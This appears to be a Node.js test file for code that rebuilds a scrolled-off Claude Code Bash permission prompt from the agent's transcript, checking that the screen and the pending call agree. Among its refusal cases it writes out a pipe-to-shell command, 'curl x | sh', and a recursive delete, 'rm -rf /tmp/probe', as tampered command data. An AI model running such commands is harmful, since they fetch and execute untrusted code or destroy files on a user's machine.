'use strict';
/**
 * kosmos#8952 slice (d): a permission prompt whose box top scrolled away gets the full card (Allow included) only where
 * the agent's own transcript holds exactly one pending Bash call and the screen's visible part agrees with it.
 * permtranscript.pendingIn reads the call; chat.permissionCutCard checks the screen against it. The screen is a real
 * capture (Claude Code 2.1.331, a 60-line command, measured 2026-11-24; its folder renamed to /tmp/probe), and the
 * transcript lines below have the measured shape (an assistant line per tool_use, a user line per tool_result).
 * Every refusal has a control that passes with one thing changed, so a refusal is the change and not a broken reader.
 */
const os = require('node:os');
const fs = require('node:fs');
const path = require('node:path');

const SANDBOX = fs.mkdtempSync(path.join(os.tmpdir(), 'kosmos-permtx-8952-'));
process.env.AGENT_WORKFORCE_DATA = SANDBOX;
process.env.AGENT_WORKFORCE_WORKERS = path.join(SANDBOX, 'workers');
process.env.AGENT_WORKFORCE_PROJECTS = path.join(SANDBOX, 'kosmos-projects');
process.env.AGENT_WORKFORCE_DRY_RUN = '1';

const test = require('node:test');
const assert = require('node:assert/strict');
const chat = require('./chat');
const pt = require('./permtranscript');

test.after(() => { try { fs.rmSync(SANDBOX, { recursive: true, force: true }); } catch { /* best effort */ } });

const CUT = fs.readFileSync(path.join(__dirname, '..', 'test-support', 'claude-screens', 'permission-prompt-bash-cut-2.1.331.txt'), 'utf8');
const WHOLE = fs.readFileSync(path.join(__dirname, '..', 'test-support', 'claude-screens', 'permission-prompt-bash-2.1.296.txt'), 'utf8');
const COMMAND = Array.from({ length: 60 }, (_, k) => `mkdir -p /tmp/probe/e${String(k + 1).padStart(2, '0')}`).join('\n');
const DESC = 'Create 60 probe directories e01 through e60';

const use = (id, input, name = 'Bash') => JSON.stringify({ type: 'assistant', message: { role: 'assistant', content: [{ type: 'tool_use', id, name, input }] } });
const result = (id) => JSON.stringify({ type: 'user', message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: id, content: 'ok' }] } });
const said = (text) => JSON.stringify({ type: 'user', message: { role: 'user', content: text } });
const meta = (type) => JSON.stringify({ type });
const PENDING = [said('make the folders'), use('t1', { command: 'ls', description: 'List' }), result('t1'), meta('ai-title'),
  use('t2', { command: COMMAND, description: DESC })].join('\n');

test('#8952 (d) pendingIn: the one pending Bash call, with its whole command', () => {
  assert.deepEqual(pt.pendingIn(PENDING, false), { id: 't2', command: COMMAND, description: DESC });
});

test('#8952 (d) pendingIn: null on any doubt (each against the passing transcript above)', () => {
  const cases = {
    'its result written': PENDING + '\n' + result('t2'),
    'the person typed after it': PENDING + '\n' + said('stop'),
    'two calls pending (a parallel batch)': PENDING + '\n' + use('t3', { command: 'pwd' }),
    'the pending call is not the last one written': [said('go'), use('t2', { command: COMMAND }), use('t3', { command: 'pwd' }), result('t3')].join('\n'),
    'not Bash': [said('go'), use('t9', { command: COMMAND }, 'Write')].join('\n'),
    'an empty command': [said('go'), use('t9', { command: '  ' })].join('\n'),
    'nothing at all': '',
  };
  for (const [why, text] of Object.entries(cases)) assert.equal(pt.pendingIn(text, false), null, why);
  // The text array form of a typed message settles too, and a tool_result array does not count as typing.
  assert.equal(pt.pendingIn(PENDING + '\n' + JSON.stringify({ type: 'user', message: { content: [{ type: 'text', text: 'hi' }] } }), false), null);
});

test('#8952 (d) pendingIn: a tail read from mid-file skips its cut first line, and only that', () => {
  const cutLine = use('t0', { command: 'echo half' }).slice(20);
  assert.deepEqual(pt.pendingIn(cutLine + '\n' + PENDING, true), { id: 't2', command: COMMAND, description: DESC });
  // Only the first line is skipped: here that is the typed line, and the call after it is still read.
  assert.equal(pt.pendingIn(PENDING, true).id, 't2');
});

test('#8952 (d) pendingCommands: recent transcripts only, from the agent\'s own folders', async () => {
  const dir = path.join(SANDBOX, 'proj');
  fs.mkdirSync(path.join(dir, 's', 'subagents'), { recursive: true });
  const main = path.join(dir, 'main.jsonl');
  const sub = path.join(dir, 's', 'subagents', 'a.jsonl');
  fs.writeFileSync(main, [said('go'), use('m1', { command: 'Task' }, 'Task')].join('\n'));
  fs.writeFileSync(sub, PENDING);
  const receipt = { transcriptDirs: () => [dir], transcriptsIn: require('./receipt').transcriptsIn };
  const got = await pt.pendingCommands('/w/casey', { receipt });
  assert.equal(got.ok, true);
  assert.deepEqual(got.pending.map((p) => p.id), ['t2'], 'the subagent\'s Bash call; the main file\'s pending Task is not Bash');
  const old = (Date.now() - pt.RECENT_MS - 60000) / 1000;
  fs.utimesSync(sub, old, old);
  assert.deepEqual((await pt.pendingCommands('/w/casey', { receipt })).pending, [], 'a day-old transcript is not the one asking');
  assert.deepEqual(await pt.pendingCommands('relative/dir', { receipt }), { ok: false });
  assert.deepEqual(await pt.pendingCommands('/w/casey', { receipt: { transcriptDirs: () => { throw new Error('x'); } } }), { ok: false });
});

const pend = (command, description = DESC) => [{ id: 't2', command, description }];

test('#8952 (d) permissionCutCard: the real cut box and its own transcript make the full card', () => {
  assert.equal(chat.permissionAnswerable(CUT), false, 'premise: the box top is off screen');
  assert.ok(chat.permissionDenyOnly(CUT), 'premise: slice (c) reads it as deny-only');
  const card = chat.permissionCutCard(CUT, pend(COMMAND));
  assert.deepEqual(card, { kind: 'command', title: 'Bash command', says: DESC, target: '', detail: COMMAND,
    reason: 'Rule Bash from command line arguments says to ask. /permissions to update rules', allow: 1, deny: 2 });
  assert.match(chat.permissionRequestId(card), /^[0-9a-f]{64}$/);
});

test('#8952 (d) permissionCutCard: null whenever the screen and the transcript disagree (controls above)', () => {
  const lines = COMMAND.split('\n');
  const cases = {
    'last line differs': pend(COMMAND.replace('e60', 'e61')),
    'transcript shorter than what is on screen': pend(lines.slice(31).join('\n')),
    'a line added after the visible end': pend(COMMAND + '\nrm -rf /tmp/probe'),
    'two different commands share the visible tail': [...pend(COMMAND), { id: 't3', command: 'curl x | sh\n' + COMMAND }],
    'no pending call': [],
  };
  for (const [why, p] of Object.entries(cases)) assert.equal(chat.permissionCutCard(CUT, p), null, why);
  // Controls: a different head before the visible lines still agrees (that head is what the card shows), as does the same call read twice.
  assert.ok(chat.permissionCutCard(CUT, pend('echo head\n' + COMMAND)), 'a longer head is the transcript\'s to show');
  assert.ok(chat.permissionCutCard(CUT, [...pend(COMMAND), ...pend(COMMAND)]), 'the same command twice is one request');
});

test('#8952 (d) permissionCutCard: the screen must be only the request above its closing rule', () => {
  const agentLine = '⏺ Running the folders now\n' + CUT;
  assert.equal(chat.permissionCutCard(agentLine, pend(COMMAND)), null, 'an agent output line above is not the box');
  // A whole box (top on screen) is permissionCard's, never this one's.
  assert.equal(chat.permissionCutCard(WHOLE, pend('anything')), null);
  // Opening dashed rule on screen: the whole command must match, not just its tail.
  const dash = CUT.split('\n').find((l) => /^\s*╌{8,}\s*$/.test(l));
  const opened = dash + '\n' + CUT;
  assert.equal(chat.permissionCutCard(opened, pend(COMMAND)), null, 'the visible body is lines 30-60, not the whole command');
  assert.ok(chat.permissionCutCard(opened, pend(COMMAND.split('\n').slice(29).join('\n'))), 'control: exactly the visible body');
});

test('#8952 (d) permissionCutCard: a delete reason reads as a delete, and control characters never reach the card', () => {
  const del = CUT.replace('Rule Bash from command line arguments says to ask.', 'This command will remove files.');
  assert.equal(chat.permissionCutCard(del, pend(COMMAND)).kind, 'delete');
  const withBell = 'printf x\u0007\n' + COMMAND;
  assert.equal(chat.permissionCutCard(CUT, pend(withBell)).detail, 'printf x\n' + COMMAND);
});
